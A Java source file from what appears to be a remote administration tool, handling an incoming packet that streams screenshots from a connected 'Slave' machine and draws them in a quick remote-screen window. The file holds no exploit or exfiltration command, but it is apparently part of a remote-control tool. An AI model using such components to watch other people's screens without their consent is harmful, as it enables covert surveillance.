package com.redpois0n.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameQuickRemoteScreen;
import com.redpois0n.utils.ImageUtils;

public class PacketQUICKDESKTOP extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameQuickRemoteScreen frame = FrameQuickRemoteScreen.instances.get(slave);
		
		int len = slave.readInt();
		
		byte[] buffer = new byte[len];
				
		slave.getDataInputStream().readFully(buffer);
		
		if (frame != null) {
			BufferedImage image = ImageUtils.decodeImage(buffer);
			
			frame.getImage().getGraphics().drawImage(image, 0, 0, frame.getImage().getWidth(), frame.getImage().getHeight(), null);
			
			frame.getLabel().repaint();
			
			frame.setSize(len / 1024);
			
			frame.getFPSThread().increase();
			
			if (frame.shouldContinue()) {
				frame.send();
			}
		}
	}

}
